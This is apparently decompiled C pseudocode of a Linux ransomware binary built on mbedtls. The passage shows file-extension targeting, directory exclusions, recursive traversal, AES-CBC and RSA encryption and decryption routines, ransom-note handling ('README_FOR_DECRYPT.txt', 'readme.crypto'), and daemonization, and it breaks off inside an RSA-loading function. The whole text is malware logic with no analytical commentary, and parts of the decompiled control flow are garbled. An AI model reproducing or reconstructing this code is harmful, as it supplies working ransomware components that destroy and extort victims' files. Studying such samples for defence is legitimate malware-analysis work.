char * g155 = "\x58\xe2\xfc\xce\xfa\x7e\x30\x61\x36\x7f\x1d\x57\xa4\xe7\x45\x5a\xab\x6e\x47\xd4\x2c\xec\x13\xbd\xf5\x3a\x67\xb2\x12\x57\xbd\xdf\x4d\x5c\x2a\xf3\x27\xcd\x64\xa6\x2c\xf3\x5a\xbd\x2b\xa6\xfa\xb4\x5b\xc9\x4f\xbc\x32\x21\xa5\xdb\x94\xfa\xe9\x5a\xe7\x12\x1a\x47\x36\x12\xd2\xe7\x9e\x3b\x07\x85\x56\x1b\xe1\x4a\xac\xa2\xfc\xcb\x61\x9c\xc5\xae\xff\xfe\x0b\xfa\x46\x2a\xf4\x3c\x16\x99\xd0\x50\xcd\x33\xb2\x8a\xc7\x73\xf7\x4b\xa0\x0e\xd1\xf3\x12\x57\x24\x35\x2f\xf5\x8d\x80\x03\x39\x27\xab\x8e\xf4\xd4\x58\x75\x14\xf0\xfb\x99\x24\xa7\xc8\x58\x73\x36\xbf\xb1\x18\x02\x4d\xb8\x67\x4a\x14\x25\x19\x49\x8e\x80\xf1\x47\x8f\x37\xba\x55\xbd\x6d\x27\x61\x8c\x65\xdc\xc5\x7f\xcf\x62\x3a\x24\x09\x4f\xcc\xa4\x0d\x35\x33\xf8\xdc\xf5\x66\xff\x29\x1c\x25\xbb\xb8\x56\x8f\xc3\xd3\x76\xa6\xd9\x53\x0f\x8a\xfb\xc7\x45\x36\xb9\xa9\x63\xb4\xf1\xc4\xcb\x73\x8b\xd0\xd1\xc8\xa7\x99\x99\x6b\xf0\x26\x5b\x98\xb5\xd4\x8a\xb9\x19\xb0\x94\xda\xc5\xd9\x34\x71\xbd\xec\x1a\x50\x22\x70\xe3\xcc\x6c\x76\xfc\x6e\xce\x0f\x4e\x17\x68\xcd\xdf\x88\x53\xbb\x2d\x55\x1b\x3a\x33\x7d\xbf\x46\xa7\x92\xc4\x5e\x45\x49\x13\xfe\x2e\xa8\xf2\xa4\x4a\x82\x66\xee\x1c\x8e\xb0\xc8\xb5\xd4\xcf\x5a\xe9\xf1\x9a"; // 0x807e700
int32_t g156 = 0; // 0x807e820
int32_t g157 = 0; // 0x807e8bc
int32_t g158 = 0; // 0x807e8e0
int32_t g159 = 0x38316767; // 0x807fd40
int32_t g160 = 0x16157e2b; // 0x807fde0
int32_t g161 = 0x49cf0716; // 0x807fe40
int32_t g162 = -0x1d413e95; // 0x807fee0
int32_t g163 = 0x30000000; // 0x807ff20
int32_t g164 = -0x7ad9752; // 0x807ff60
int32_t g165 = 16; // 0x807ff90
char * g166 = "\xd0\x9d\xc2\x9a\x82\x14\x61\x9a\x20\x87\x7c\x76\xdb\x1f\x0b\x3f"; // 0x807ffa0
char * g167 = "\xa0\x9e\x66\x7f\x3b\xcc\x90\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e0
char * g168 = "\x9e\x66\x7f\x3b\xcc\x90\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e1
char * g169 = "\x66\x7f\x3b\xcc\x90\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e2
char * g170 = "\x7f\x3b\xcc\x90\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e3
char * g171 = "\x3b\xcc\x90\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e4
char * g172 = "\xcc\x90\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e5
char * g173 = "\x90\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e6
char * g174 = "\x8b\xb6\x7a\xe8\x58\x4c\xaa\x73\xb2\xc6\xef\x37\x2f\xe9\x4f\x82\xbe\x54\xff\x53\xa5\xf1\xd3\x6f\x1c\x10\xe5\x27\xfa\xde\x68\x2d\x1d\xb0\x56\x88\xc2\xb3\xe6\xc1\xfd"; // 0x80804e7
int32_t g175 = 0x1010101; // 0x8080520
char * g176; // 0x8080540
char * g177 = "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x04\x05\x06\x07\x0c\x0d\x0e\x0f\x10\x11\x12\x13\xff\x18\x19\xff\x1f\x1c\x1d\x1e\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"; // 0x8080554
char * g178 = "\x04\x05\x06\x07\x0c\x0d\x0e\x0f\x10\x11\x12\x13\xff\x18\x19\xff\x1f\x1c\x1d\x1e\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"; // 0x8080568
char * g179 = "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"; // 0x808057c
char * g180 = "\x15\x16\x17\x14\xff\xff\xff\xff\x12\x13\x10\x11\x0b\x08\x09\x0a\x0f\x0c\x0d\x0e\x19\x1a\x1b\x18\x1d\x1e\x1f\x1c\x12\x13\x10\x11\xff\xff\xff\xff\xff\xff\xff\xff\x20\x20\x43\x43\x4d\x3a\x20\x73\x65\x74\x75\x70\x20\x66\x61\x69\x6c\x65\x64"; // 0x80805e0
int32_t g181 = 0x43424140; // 0x8080640
int32_t g182 = 0x4f4e4d4c; // 0x808064c
int32_t g183 = 8; // 0x8080658
int32_t g184 = 24; // 0x8080664
int32_t g185 = 20; // 0x8080670
int32_t g186 = 0x13121110; // 0x8080680
int32_t g187 = 0x3020100; // 0x808068c
char * g188 = "\x71\x62\x01\x5b\x4d\xac\x25\x5d"; // 0x80806c0
char (*g189)[19] = "mbedtls_pk_encrypt"; // 0x8082308
int32_t g190 = -1; // 0x808230c
int32_t g191 = -1; // 0x8082310
int32_t g192 = 1; // 0x8082314
struct __dirstream * g193 = NULL; // 0x80823c8
int32_t g194 = 0; // 0x80823cc
struct _IO_FILE * g195 = NULL; // 0x80823d0
int32_t g196 = 0; // 0x80823d4
int32_t g197 = 0; // 0x80823d8
int32_t g198 = 0; // 0x80823e0
char * g199; // 0x8082400
int32_t g200 = 0; // 0x8082500
int32_t g201 = 0; // 0x8082900
int32_t g202 = 0; // 0x8082d00
int32_t g203 = 0; // 0x8083100
char * g204; // 0x8083500
int32_t g205 = 0; // 0x8083563
int32_t g206 = 0; // 0x8083600
int32_t g207 = 0; // 0x8083a00
int32_t g208 = 0; // 0x8083e00
int32_t g209 = 0; // 0x8084200
int32_t g210 = 0; // 0x8084600
int32_t g211 = 0; // 0x8084628
int32_t g212 = 0; // 0x808462c
int32_t g213 = 0; // 0x8084640
int32_t g214 = 0; // 0x8084644
int32_t g215 = 0; // 0x8084648
int32_t g216 = 0; // 0x808464c
int32_t g217 = 0; // 0x8084660
int32_t g218 = 0; // 0x8084690
int32_t g219 = 0; // 0x8084694
int32_t g220 = 0; // 0x8084b24
int32_t g221 = 0; // 0x8084b28
int32_t g222 = 0; // 0x8084f3c
int32_t g223 = 0; // 0x8085070
char * g224; // 0x80852d8
int32_t g225 = 0; // 0x8085418
int32_t g226 = 0; // 0x8085420
int32_t g227 = 0; // 0x8085424
int32_t g228 = 0; // 0x8085500
int32_t g229 = 0; // 0x808550c
int32_t g230 = 0; // 0x8085510
int32_t g231 = 0; // 0x8085514
int32_t g232 = 0; // 0x808551c
char * g233; // 0x8085538
int32_t g234 = 0; // 0x808553c
int32_t g235 = 0; // 0x8085540
int32_t g236 = 0; // 0x8085544
bool g237 = false; // zf
int32_t * g110 = &g104; // 0x807b340
int32_t * g111 = &g105; // 0x807b3a0
int32_t * g112 = &g106; // 0x807b460
int32_t * g113 = &g107; // 0x807b4c0
int32_t * g114 = &g108; // 0x807b5c0

// ------------------------ Functions -------------------------

// Address range: 0x8048094 - 0x80480a4
void _init(void) {
    // 0x8048094
    abort();
    // UNREACHABLE
}

// Address range: 0x80480b0 - 0x80480bd
int32_t _start(void) {
    g2 = 0;
    int32_t v1;
    g1 = &v1;
    function_80480be();
    return 0;
}

// Address range: 0x80480be - 0x80480ca
void function_80480be(void) {
    // 0x80480be
    _start_c((int32_t *)g1);
}

// Address range: 0x80480cb - 0x80480ef
void _start_c(int32_t * a1) {
    int32_t v1 = (int32_t)a1 + 4; // 0x80480de
    g6 = v1;
    int32_t v2 = *a1; // 0x80480e2
    g1 = __libc_start_main((int32_t * (*)(int32_t, char **, char **))main, v2, (char **)v1, (void (**)())_init, (void (**)())_fini, NULL);
}

// Address range: 0x8048146 - 0x804814f
int32_t function_8048146(int32_t a1) {
    // 0x8048146
    return g7;
}

// Address range: 0x8048174 - 0x80481c9
int32_t private_decrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t result = 0; // bp-16
    if (mbedtls_pk_decrypt(&g225, a1, a2, a3) == 0) {
        // 0x80481c5
        g1 = result;
        // branch -> 0x80481c8
    } else {
        // 0x80481ae
        printf(" failed\n  ! mbedtls_pk_decrypt returned -0x%04x\n", (int32_t)&a4);
        g1 = -1;
        result = -1;
        // branch -> 0x80481c8
    }
    // 0x80481c8
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x80481ca - 0x804821f
int32_t public_encrypt(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t result = 0; // bp-16
    if (mbedtls_pk_encrypt(&g225, a1, a2, a3) == 0) {
        // 0x804821b
        g1 = result;
        // branch -> 0x804821e
    } else {
        // 0x8048204
        printf(" failed\n  ! mbedtls_pk_encrypt returned -0x%04x\n", (int32_t)&a4);
        g1 = -1;
        result = -1;
        // branch -> 0x804821e
    }
    // 0x804821e
    int32_t v1;
    g2 = v1;
    return result;
}

// Address range: 0x8048220 - 0x804827b
int32_t randstring(int32_t a1) {
    // 0x8048220
    int32_t v1;
    int32_t result; // 0x8048275
    if (a1 == 0) {
        result = 0;
        // 0x8048272
        g1 = result;
        g2 = v1;
        return result;
    }
    char * mem = malloc(a1 + 1); // 0x8048239
    int32_t v2 = (int32_t)mem; // 0x8048239_3
    if (mem == NULL) {
        result = v2;
        // 0x8048272
        g1 = result;
        g2 = v1;
        return result;
    }
    int32_t v3 = 0; // esi
    int32_t v4 = 0;
    if (a1 != 0) {
        int32_t v5 = rand(); // 0x8048250
        char v6 = *(char *)((int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 69) + (int32_t)"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#'?!"); // 0x804825d
        *(char *)(v3 + v2) = v6;
        int32_t v7 = v3 + 1; // 0x8048266
        v3 = v7;
        while (v7 < a1) {
            // 0x8048250
            v5 = rand();
            v6 = *(char *)((int32_t)((0x100000000 * (int64_t)(v5 >> 31) | (int64_t)v5) % 69) + (int32_t)"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#'?!");
            *(char *)(v3 + v2) = v6;
            v7 = v3 + 1;
            v3 = v7;
            // continue -> 0x8048250
        }
        // 0x8048267
        v4 = a1;
        // branch -> 0x804826b
    }
    // 0x804826b
    *(char *)(v2 + v4) = 0;
    result = v2;
    // branch -> 0x8048272
    // 0x8048272
    g1 = result;
    g2 = v1;
    return result;
}

// Address range: 0x804827c - 0x80482bb
int32_t checkExclude(char * str) {
    // 0x804827c
    int32_t result; // 0x80482bb_2
    if (strcmp(str, "/") != 0) {
        // 0x804829f
        result = strcmp((char *)(int32_t)str, "/root/.ssh") == 0;
        // branch -> 0x80482b7
    } else {
        result = 1;
    }
    // 0x80482b7
    return result;
}

// Address range: 0x80482ef - 0x8048327
int32_t is_ignore_dir(char * str2) {
    int32_t v1 = g3; // 0x80482f6
    int32_t v2 = 0; // ebx
    if (g194 > 0) {
        int32_t v3 = 0; // 0x804830320
        while (true) {
            int32_t str = *(int32_t *)((int32_t)g193 + 4 * v3); // 0x8048303
            if (strcmp((char *)str, (char *)(int32_t)str2) != 0) {
                int32_t v4 = v2 + 1; // 0x8048316
                v2 = v4;
                if (v4 >= g194) {
                    // 0x804831f
                    // branch -> 0x8048321
                    // 0x8048321
                    g3 = v1;
                    return 0;
                }
                // 0x8048316
                v3 = v4;
                // branch -> 0x80482fb
                continue;
            }
            // 0x8048321
            g3 = v1;
            return 1;
        }
    }
    // 0x8048321
    g3 = v1;
    return 0;
}

// Address range: 0x8048328 - 0x804836c
char * checkFileExt(char * str) {
    int32_t v1 = 0; // ebx
    int32_t found_char_pos = (int32_t)strrchr(str, 46); // 0x8048336_4
    int32_t str2 = found_char_pos; // 0x804834d
    // branch -> 0x8048340
    while (true) {
        // 0x8048340
        if (str2 != 0) {
            int32_t str3 = *(int32_t *)(4 * v1 + (int32_t)&g9); // 0x8048346
            if (strcmp((char *)str2, (char *)str3) == 0) {
                // 0x8048366
                return (char *)1;
            }
        }
        int32_t v2 = v1 + 1; // 0x804835e
        v1 = v2;
        if (v2 == 24) {
            // 0x8048364
            // branch -> 0x8048366
            // 0x8048366
            return (char *)0;
        }
        // 0x8048340
        str2 = found_char_pos;
        // branch -> 0x8048340
    }
}

// Address range: 0x804836d - 0x80483b0
int32_t setChmod(char * path, int32_t amode, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x804836d
    int32_t v1;
    char * path2 = (char *)v1; // bp-4
    int32_t v2 = (int32_t)&path2; // ebp
    int32_t v3 = access(path, amode); // 0x804837c
    int32_t result = v3; // 0x80483b0_2
    if (v3 == -1) {
        // 0x8048389
        chmod((char *)(int32_t)path, 511);
        v2 = (int32_t)path2;
        int32_t amode2;
        result = access(path2, amode2);
        // branch -> 0x80483aa
    }
    // 0x80483aa
    g3 = *(int32_t *)(v2 - 8);
    g7 = *(int32_t *)(v2 - 4);
    return result;
}

// Address range: 0x80483b1 - 0x80483ef
struct _IO_FILE * putReadme(int32_t a1, int32_t a2, int32_t a3) {
    struct _IO_FILE * stream = fopen64((char *)a1, "ab+"); // 0x80483c0
    struct _IO_FILE * result; // 0x80483ef_2
    if (stream != NULL) {
        // 0x80483ce
        fputs((char *)g195, stream);
        result = (struct _IO_FILE *)fclose(g195);
        // branch -> 0x80483eb
    } else {
        result = NULL;
    }
    // 0x80483eb
    return result;
}

// Address range: 0x80483f0 - 0x804847d
struct _IO_FILE * loadHtmlFile(int32_t a1, char ** a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x80483f0
    int32_t v1;
    char * path = (char *)v1; // bp-4
    struct _IO_FILE * stream = fopen64("./index.crypto", "rb"); // 0x8048403
    int32_t stream2 = (int32_t)stream; // ebx
    int32_t v2; // 0x8048476
    if (stream == NULL) {
        // 0x8048476
        v2 = (int32_t)&path;
        g3 = *(int32_t *)(v2 - 12);
        g7 = *(int32_t *)(v2 - 8);
        g5 = *(int32_t *)(v2 - 4);
        return NULL;
    }
    // 0x8048411
    fseek(stream, 0, SEEK_END);
    int32_t curr_file_offset = ftell((struct _IO_FILE *)stream2); // edi
    fseek((struct _IO_FILE *)stream2, 0, SEEK_SET);
    char * mem = malloc(curr_file_offset); // 0x8048436
    if (mem != NULL) {
        // 0x8048444
        fread_unlocked(mem, 1, curr_file_offset, (struct _IO_FILE *)stream2);
        // branch -> 0x8048451
    }
    // 0x8048451
    fclose((struct _IO_FILE *)stream2);
    g197 = (int32_t)mem;
    struct _IO_FILE * result = (struct _IO_FILE *)unlink(path); // 0x804847d_2
    // branch -> 0x8048476
    // 0x8048476
    v2 = (int32_t)path;
    g3 = *(int32_t *)(v2 - 12);
    g7 = *(int32_t *)(v2 - 8);
    g5 = *(int32_t *)(v2 - 4);
    return result;
}

// Address range: 0x804847e - 0x8048504
struct _IO_FILE * loadTextFile(void) {
    int32_t v1 = g3; // 0x8048483
    struct _IO_FILE * stream = fopen64("./readme.crypto", "rb"); // 0x8048491
    int32_t stream2 = (int32_t)stream; // ebx
    if (stream == NULL) {
        // 0x80484fd
        g3 = v1;
        return NULL;
    }
    // 0x804849f
    fseek(stream, 0, SEEK_END);
    int32_t curr_file_offset = ftell((struct _IO_FILE *)stream2); // edi
    fseek((struct _IO_FILE *)stream2, 0, SEEK_SET);
    char * mem = malloc(curr_file_offset); // 0x80484c4
    if (mem != NULL) {
        // 0x80484d2
        fread_unlocked(mem, 1, curr_file_offset, (struct _IO_FILE *)stream2);
        // branch -> 0x80484df
    }
    // 0x80484df
    fclose((struct _IO_FILE *)stream2);
    g195 = (struct _IO_FILE *)(int32_t)mem;
    struct _IO_FILE * result = (struct _IO_FILE *)unlink("./readme.crypto"); // 0x8048504_2
    // branch -> 0x80484fd
    // 0x80484fd
    g3 = v1;
    return result;
}

// Address range: 0x8048505 - 0x804854d
int32_t extract(char * str) {
    int32_t str2 = (int32_t)str; // ebx
    char * mem = malloc(strlen(str)); // 0x804851d
    int32_t str3 = (int32_t)mem; // edi
    strcpy(mem, (char *)str2);
    free((char *)str2);
    *strrchr((char *)str3, 47) = 0;
    return str3;
}

// Address range: 0x804854e - 0x804859a
int32_t aes_decrypt(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = g3; // 0x8048551
    int32_t v2;
    g3 = &v2;
    mbedtls_aes_init((char *)&v2);
    mbedtls_aes_setkey_dec((int32_t *)g3, a3, 128);
    mbedtls_aes_crypt_cbc(g3, 0, 16, (int32_t *)a4, a1, a5);
    mbedtls_aes_free((char *)g3);
    g3 = v1;
    return result;
}

// Address range: 0x804859b - 0x8048832
int32_t decrypt_file(int32_t path3, int32_t path4) {
    int32_t v1 = g7; // 0x804859f
    int32_t v2 = g3; // 0x80485a0
    char * path2 = (char *)path4;
    printf("Decrypting file: %s\n", path2);
    char * path = (char *)path3;
    g3 = (int32_t)fopen64(path, "rb");
    struct _IO_FILE * v3 = fopen64(path2, "wb"); // 0x80485cf
    int32_t file2 = (int32_t)v3; // 0x80485cf_5
    g7 = file2;
    int32_t file = g3; // 0x80485e3
    int32_t result;
    if (v3 == NULL) {
        // 0x80485e3
        if (file == 0) {
            // 0x804882b
            g3 = v2;
            g7 = v1;
            return 0;
        }
        // 0x80485f5
        result = fclose((struct _IO_FILE *)file);
        // branch -> 0x8048828
        // 0x8048828
        // branch -> 0x804882b
        // 0x804882b
        g3 = v2;
        g7 = v1;
        return result;
    }
    // 0x80485dd
    if (file == 0) {
        // 0x80485f5
        result = fclose((struct _IO_FILE *)file2);
        // branch -> 0x8048828
        // 0x8048828
        // branch -> 0x804882b
        // 0x804882b
        g3 = v2;
        g7 = v1;
        return result;
    }
    // 0x80485ff
    int32_t buf;
    stat(path, (struct stat *)&buf);
    int32_t mode;
    fread_unlocked((char *)&mode, 1, 4, (struct _IO_FILE *)g3);
    struct _IO_FILE * v4 = (struct _IO_FILE *)g3;
    int32_t v5;
    fread_unlocked((char *)&v5, 1, 4, v4);
    char * mem = malloc(2048); // 0x804864b
    int32_t v6 = (int32_t)mem; // 0x804864b_3
    memset(mem, 0, 512);
    int32_t v7; // eax
    if (fread_unlocked(mem, 1, v5, (struct _IO_FILE *)g3) < v5) {
        // 0x804867a
        fclose((struct _IO_FILE *)g3);
        v7 = fclose((struct _IO_FILE *)g7);
        // branch -> 0x804874d
        // 0x804874d
        free((char *)v6);
        result = v7;
        // branch -> 0x8048828
    } else {
        char * mem2 = malloc(1024); // 0x804869f
        int32_t v8 = (int32_t)mem2; // 0x804869f_3
        g5 = v8;
        memset(mem2, 0, 256);
        if (private_decrypt(v6, v5, v8, (int32_t)v4) != -1) {
            // 0x80486ec
            int32_t v9;
            int32_t v10 = v9 - v5; // 0x80486f2
            uint32_t v11 = v10 - 24; // 0x80486fb
            int32_t v12;
            if (fread_unlocked((char *)&v12, 1, 16, (struct _IO_FILE *)g3) > 15) {
                // 0x8048757
                uint32_t v13;
                g5 = v13 % 16;
                int32_t v14;
                int32_t v15 = &v14; // 0x8048778_0
                int32_t data;
                int32_t v16 = &data; // 0x804878b_0
                if (v11 > 0) {
                    int32_t v17 = 0; // 0x80487e141139
                    while (true) {
                        // 0x8048773
                        if (fread_unlocked((char *)&v14, 1, 16, (struct _IO_FILE *)g3) >= 1) {
                            // 0x8048788
                            aes_decrypt(v15, 16, v8, (int32_t)&v12, v16);
                            int32_t nmemb = g5; // 0x80487ab
                            int32_t v18; // 0x80487d4
                            if (nmemb == 0) {
                              lab_0x80487bf:;
                                // 0x80487bf
                                // branch -> 0x80487c4
                            } else {
                                // 0x80487af
                                if (v17 != v10 - 40) {
                                    goto lab_0x80487bf;
                                }
                                // 0x80487c4
                                fwrite((char *)&data, 1, nmemb, (struct _IO_FILE *)g7);
                                v18 = v17 + 16;
                                if (v18 >= v11) {
                                    // break -> 0x80487e9
                                    break;
                                }
                                v17 = v18;
                                // continue -> 0x8048773
                                continue;
                            }
                            // 0x80487c4
                            fwrite((char *)&data, 1, 16, (struct _IO_FILE *)g7);
                            v18 = v17 + 16;
                            if (v18 >= v11) {
                                // break -> 0x80487e9
                                break;
                            }
                            v17 = v18;
                            // continue -> 0x8048773
                            continue;
                        }
                    }
                    // 0x80487e9
                    fclose((struct _IO_FILE *)g3);
                    fclose((struct _IO_FILE *)g7);
                    chmod(path2, mode);
                    free(mem);
                    free(mem2);
                    // branch -> 0x8048823
                    // 0x8048823
                    result = unlink((char *)path3);
                    // branch -> 0x8048828
                    // 0x8048828
                    // branch -> 0x804882b
                    // 0x804882b
                    g3 = v2;
                    g7 = v1;
                    return result;
                }
                // 0x80487e9
                fclose((struct _IO_FILE *)g3);
                fclose((struct _IO_FILE *)g7);
                chmod(path2, mode);
                free(mem);
                free(mem2);
                // branch -> 0x8048823
                // 0x8048823
                result = unlink((char *)path3);
                // branch -> 0x8048828
            } else {
                // 0x8048729
                fclose((struct _IO_FILE *)g3);
                v7 = fclose((struct _IO_FILE *)g7);
                free(mem);
                // branch -> 0x804874d
                // 0x804874d
                free((char *)v8);
                result = v7;
                // branch -> 0x8048828
            }
            // 0x8048828
            // branch -> 0x804882b
            // 0x804882b
            g3 = v2;
            g7 = v1;
            return result;
        }
        // 0x80486d2
        fclose((struct _IO_FILE *)g3);
        fclose((struct _IO_FILE *)g7);
        // branch -> 0x8048823
        // 0x8048823
        result = unlink((char *)path4);
        // branch -> 0x8048828
    }
    // 0x8048828
    // branch -> 0x804882b
    // 0x804882b
    g3 = v2;
    g7 = v1;
    return result;
}

// Address range: 0x8048833 - 0x8048a4d
struct __dirstream * decrypt_all(char * name) {
    int32_t v1 = g7; // 0x8048837
    int32_t v2 = g3; // 0x8048838
    struct __dirstream * dirp = opendir(name); // 0x8048842
    if (dirp == NULL) {
        // 0x8048a46
        g3 = v2;
        g7 = v1;
        return (struct __dirstream *)0;
    }
    // 0x8048858
    int32_t v3;
    g7 = &v3;
    struct dirent64 * v4 = readdir64(dirp); // 0x804886773
    int32_t v5; // 0x8048a4d_2
    if (v4 == NULL) {
        // 0x8048a35
        v5 = closedir(dirp);
        // branch -> 0x8048a46
        // 0x8048a46
        g3 = v2;
        g7 = v1;
        return (struct __dirstream *)v5;
    }
    int32_t v6 = (int32_t)v4; // bp+376
    while (true) {
        int32_t str = v6 + 19; // 0x8048879
        g3 = str;
        if (((int32_t)*(char *)(v6 + 18) || v6 & -256) == 4) {
            // 0x80489e9
            if (strcmp("README_FOR_DECRYPT.txt", (char *)str) == 0) {
                // 0x8048a01
                int32_t str2;
                snprintf((char *)&str2, 0x1000, "%s/%s", name, (struct __dirstream *)g3);
                unlink((char *)&str2);
                // branch -> 0x8048a2d
              lab_0x8048a2d:;
                // 0x8048a2d
                // branch -> 0x804885e
            }
        } else {
            // 0x8048887
            if (strcmp((char *)str, "..") != 0) {
                // 0x804889b
                if (strcmp((char *)g3, ".") != 0) {
                    // 0x80488af
                    int32_t chars_printed;
                    if (strcmp("/", name) == 0) {
                        // 0x80488c5
                        chars_printed = snprintf((char *)g7, 0x1000, "/%s", (char *)g3);
                        // branch -> 0x80488f5
                    } else {
                        // 0x80488db
                        chars_printed = snprintf((char *)g7, 0x1000, "%s/%s", name, (struct __dirstream *)g3);
                        // branch -> 0x80488f5
                    }
                    int32_t v7 = chars_printed - 4095; // 0x80488f5
                    v5 = chars_printed;
                    if (v7 == 0 || v7 < 0 ^ (4094 - chars_printed & chars_printed) < 0) {
                        // 0x8048900
                        decrypt_all((char *)g7);
                        // branch -> 0x8048a2d
                        goto lab_0x8048a2d;
                    }
                    // 0x8048a46
                    g3 = v2;
                    g7 = v1;
                    return (struct __dirstream *)v5;
                }
            }
        }
        struct dirent64 * v8 = readdir64(dirp); // 0x8048867
        if (v8 == NULL) {
            // break -> 0x8048a35
            break;
        }
        v6 = (int32_t)v8;
        // continue -> 0x8048879
    }
    // 0x8048a35
    v5 = closedir(dirp);
    // branch -> 0x8048a46
    // 0x8048a46
    g3 = v2;
    g7 = v1;
    return (struct __dirstream *)v5;
}

// Address range: 0x8048a4e - 0x8048a8d
char * up_decrypt(char * str) {
    int32_t v1 = g3; // 0x8048a51
    char * mem = malloc(1024); // 0x8048a5a
    g3 = (int32_t)mem;
    int32_t dest_str = (int32_t)strcpy(mem, str); // 0x8048a67_5
    int32_t v2;
    int32_t v3 = &v2; // 0x8048a81_4
    int32_t v4 = g3;
    if (*(char *)v4 == 0) {
        // 0x8048a89
        g3 = v1;
        return (char *)dest_str;
    }
    *(int32_t *)(v3 - 16) = v4;
    *(int32_t *)(v3 - 20) = 0x8048a77;
    decrypt_all(str);
    *(int32_t *)g8 = g3;
    *(int32_t *)(g8 - 4) = 0x8048a7f;
    int32_t v5 = extract(str); // 0x8048a7a
    g3 = v5;
    // branch -> 0x8048a6e
    while (*(char *)v5 != 0) {
        // 0x8048a6e
        *(int32_t *)(v3 - 16) = v5;
        *(int32_t *)(v3 - 20) = 0x8048a77;
        decrypt_all(str);
        *(int32_t *)g8 = g3;
        *(int32_t *)(g8 - 4) = 0x8048a7f;
        v5 = extract(str);
        g3 = v5;
        // continue -> 0x8048a6e
    }
    // 0x8048a89
    g3 = v1;
    return (char *)v5;
}

// Address range: 0x8048a8e - 0x8048ada
int32_t aes_encrypt(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = g3; // 0x8048a91
    int32_t v2;
    g3 = &v2;
    mbedtls_aes_init((char *)&v2);
    mbedtls_aes_setkey_enc((int32_t *)g3, a3, 128);
    mbedtls_aes_crypt_cbc(g3, 1, 16, (int32_t *)a4, a1, a5);
    mbedtls_aes_free((char *)g3);
    g3 = v1;
    return result;
}

// Address range: 0x8048adb - 0x8048b71
int32_t createDaemon(void) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x8048ade
    g3 = getpid();
    int32_t v3 = fork(); // 0x8048ae9
    g1 = v3;
    if (v3 < 0) {
        // 0x8048adb
        // branch -> 0x8048b37
        // 0x8048b37
        // branch -> 0x8048b08
        // 0x8048b08
        exit(1);
        // UNREACHABLE
    }
    // 0x8048af3
    int32_t status;
    if (v3 == 0) {
        // 0x8048b0d
        umask(0);
        int32_t v4 = setsid(); // 0x8048b17
        g1 = v4;
        if (v4 >= 0) {
            int32_t v5 = chdir("/"); // 0x8048b2b
            g1 = v5;
            if (v5 > 0) {
                // 0x8048b3e
                close(0);
                close(1);
                close(2);
                g6 = (int32_t)(struct __dirstream *)2;
                int32_t v6;
                g4 = v6;
                int32_t result = kill(g3, SIGKILL); // 0x8048b65
                g1 = result;
                g3 = v2;
                g2 = v1;
                return result;
            }
        }
        // 0x8048b37
        status = 1;
        // branch -> 0x8048b08
    } else {
        // 0x8048af5
        int32_t stat_loc;
        g1 = wait((int32_t)&stat_loc);
        status = 0;
        // branch -> 0x8048b08
    }
    // 0x8048b08
    exit(status);
    // UNREACHABLE
}

// Address range: 0x8048b72 - 0x8048c36
int32_t loadRSA(int32_t a1, char ** a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g5; // 0x8048b75
    int32_t v2 = g7; // 0x8048b76
    int32_t v3 = g3; // 0x8048b77
    g3 = a1;
    g7 = (int32_t)a2;
    mbedtls_ctr_drbg_init((char *)&g224);
    mbedtls_entropy_init((char *)&g223);
